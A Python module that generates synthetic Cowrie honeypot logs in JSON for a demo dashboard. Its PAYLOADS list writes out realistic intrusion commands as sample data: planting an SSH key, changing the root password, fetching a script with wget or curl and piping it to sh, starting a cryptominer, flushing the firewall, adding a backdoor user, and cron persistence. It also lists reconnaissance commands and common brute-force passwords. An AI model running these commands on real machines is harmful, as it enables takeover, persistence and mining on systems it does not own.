"""Synthetic Cowrie logs for previewing the dashboard before real data exists.

The output follows Cowrie 3.x's JSON event format, so it exercises the exact
same ingest path as production logs. Malware URLs use the RFC 5737
documentation ranges and hashes are random: nothing here points at a real host.
Pages built from it are flagged "demo" and the dashboard says so loudly.
"""
from __future__ import annotations

import datetime as dt
import hashlib
import json
import random
from pathlib import Path

USERS = ["root"] * 14 + ["admin"] * 4 + [
    "ubuntu", "user", "test", "oracle", "postgres", "pi", "git", "ftpuser", "guest",
    "support", "deploy", "hadoop", "mysql", "debian", "ubnt", "minecraft", "sol", "solana",
    "validator", "docker", "jenkins", "tomcat", "elastic", "steam", "nginx",
]
PASSWORDS = ["123456"] * 6 + ["password"] * 3 + ["admin"] * 3 + ["root"] * 2 + [
    "12345678", "123456789", "1234", "12345", "qwerty", "123", "test", "1qaz2wsx", "P@ssw0rd",
    "admin123", "toor", "raspberry", "ubnt", "changeme", "abc123", "password123", "111111",
    "000000", "1q2w3e4r", "default", "Passw0rd!", "root123", "3245gs5662d34", "user", "guest",
    "oracle", "", "qwe123", "Aa123456", "welcome1", "solana", "validator",
]
CLIENTS = ["SSH-2.0-Go"] * 8 + ["SSH-2.0-libssh_0.10.6"] * 3 + ["SSH-2.0-libssh2_1.11.0"] * 2 + [
    "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10", "SSH-2.0-paramiko_3.4.0", "SSH-2.0-PuTTY_Release_0.80",
    "SSH-2.0-ZGrab ZGrab SSH Survey", "SSH-2.0-Nmap-SSH2-Hostkey", "SSH-2.0-AsyncSSH_2.14.2",
]
RECON = [
    "uname -a", "uname -s -v -n -r -m", "cat /proc/cpuinfo | grep name | wc -l", "nproc", "whoami",
    "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
    "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'", "ls -lh $(which ls)", "which ls",
    "crontab -l", "w", "uname -m", "top", "lscpu | grep Model", "cat /etc/passwd",
    "df -h | head -n 2 | awk 'FNR == 2 {print $2;}'", "echo -e \"\\x6F\\x6B\"", "ifconfig", "ps aux",
]
PAYLOADS = [
    ("cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ-demo-key mdrfckr\""
     ">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~", None),
    ("cd ~; chattr -ia .ssh; lockr -ia .ssh", None),
    ("echo \"root:Xk29fLq7\"|chpasswd|bash", None),
    ("cd /tmp || cd /var/run || cd /mnt; wget http://203.0.113.45/bins.sh; chmod 777 bins.sh; "
     "sh bins.sh; rm -rf *", "http://203.0.113.45/bins.sh"),
    ("curl -s http://198.51.100.23/x/xmrig -o /tmp/.x && chmod +x /tmp/.x && "
     "/tmp/.x -o stratum+tcp://pool.example.net:3333", "http://198.51.100.23/x/xmrig"),
    ("wget -q http://192.0.2.77/.s/k.sh -O- | sh", "http://192.0.2.77/.s/k.sh"),
    ("systemctl stop firewalld; iptables -F; history -c", None),
    ("useradd -m -s /bin/bash sysadm; echo 'sysadm:Qwe!2024'|chpasswd", None),
    ("(crontab -l; echo '*/5 * * * * curl -fsSL http://203.0.113.9/c.sh|sh') | crontab -",
     "http://203.0.113.9/c.sh"),
]
TELNET = ["enable", "system", "shell", "sh", "linuxshell", "/bin/busybox ECCHI", "cat /proc/mounts"]


def _public_ip(rng: random.Random) -> str:
    reserved = {0, 10, 100, 127, 169, 172, 192, 198, 203}
    while True:
        first = rng.randint(1, 223)
        if first not in reserved:
            return f"{first}.{rng.randint(0, 255)}.{rng.randint(0, 255)}.{rng.randint(1, 254)}"


def _hassh(client: str) -> str:
    return hashlib.md5(client.encode()).hexdigest()


def generate(out_dir: Path, days: int = 45, seed: int = 7, today: dt.date | None = None) -> list[Path]:
    """Write cowrie.json.YYYY-MM-DD files for the last `days` days; returns their paths."""
    rng = random.Random(seed)
    today = today or dt.datetime.now(dt.timezone.utc).date()
    out_dir.mkdir(parents=True, exist_ok=True)
    # Recurring actors produce the "top IPs"; one-off scanners make up the long tail.
    actors = [(_public_ip(rng), rng.choice(["brute", "brute", "loader", "scan"])) for _ in range(40)]
    files = []
    for offset in range(days - 1, -1, -1):
        day = today - dt.timedelta(days=offset)
        age = days - offset                       # sensor gets discovered within a few days
        base = 900 * min(1.0, 0.25 + age / 6) * (1.15 if day.weekday() < 5 else 0.9)
        n_sessions = int(base * rng.uniform(0.75, 1.3) * (0.35 if offset == 0 else 1))
        events = []
        for _ in range(n_sessions):
            if rng.random() < 0.55:
                ip, kind = rng.choice(actors)
            else:
                ip, kind = _public_ip(rng), rng.choice(["scan", "scan", "brute", "brute", "loader"])
            hour = rng.choices(range(24), weights=[1 + (h in (2, 3, 4, 14, 15)) * 0.8 for h in range(24)])[0]
            if offset == 0:
                hour = hour * 9 // 24              # today is only partly over
            start = dt.datetime.combine(day, dt.time(hour), dt.timezone.utc) + dt.timedelta(
                seconds=rng.randint(0, 3599))
            events += _session(rng, ip, kind, start)
        events.sort(key=lambda e: e["timestamp"])
        path = out_dir / f"cowrie.json.{day.isoformat()}"
        path.write_text("".join(json.dumps(e) + "\n" for e in events), encoding="utf-8")
        files.append(path)
    return files


def _session(rng: random.Random, ip: str, kind: str, start: dt.datetime) -> list[dict]:
    protocol = "telnet" if rng.random() < 0.14 else "ssh"
    sid = "%012x" % rng.getrandbits(48)
    clock = [start]
    base = {"session": sid, "protocol": protocol, "src_ip": ip, "src_port": rng.randint(1024, 65535),
            "dst_ip": "10.42.0.4", "dst_port": 2222 if protocol == "ssh" else 2223,
            "sensor": "azure-demo"}

    def event(eventid: str, **fields) -> dict:
        clock[0] += dt.timedelta(milliseconds=rng.randint(40, 1500))
        return {**base, **fields, "eventid": eventid,
                "timestamp": clock[0].strftime("%Y-%m-%dT%H:%M:%S.%fZ")}

    out = [event("cowrie.session.connect")]
    if protocol == "ssh":
        client = rng.choice(CLIENTS)
        out.append(event("cowrie.client.version", version=client))
        out.append(event("cowrie.client.kex", hassh=_hassh(client)))
    if kind != "scan":
        tries = rng.randint(1, 6) if kind == "brute" else rng.randint(1, 2)
        for i in range(tries):
            user = rng.choice(USERS)
            password = rng.choice(PASSWORDS)
            # Cowrie's default user db accepts root with almost any password.
            ok = (kind == "loader" and i == tries - 1) or (user == "root" and password not in ("root", "123456")
                                                           and rng.random() < 0.2)
            out.append(event("cowrie.login.success" if ok else "cowrie.login.failed",
                             username=user, password=password))
            if ok:
                commands = (rng.sample(TELNET, 4) if protocol == "telnet"
                            else rng.sample(RECON, rng.randint(1, 5)))
                if kind == "loader" and protocol == "ssh":
                    commands.append(rng.choice(PAYLOADS)[0])
                for command in commands:
                    out.append(event("cowrie.command.input", input=command))
                    url = next((u for c, u in PAYLOADS if c == command and u), None)
                    if url:
                        sha = hashlib.sha256(f"{url}:{rng.randint(0, 2)}".encode()).hexdigest()
                        out.append(event("cowrie.session.file_download", url=url, shasum=sha,
                                         outfile=f"var/lib/cowrie/downloads/{sha}"))
                break
    out.append(event("cowrie.session.closed",
                     duration_ms=int((clock[0] - start).total_seconds() * 1000)))
    return out
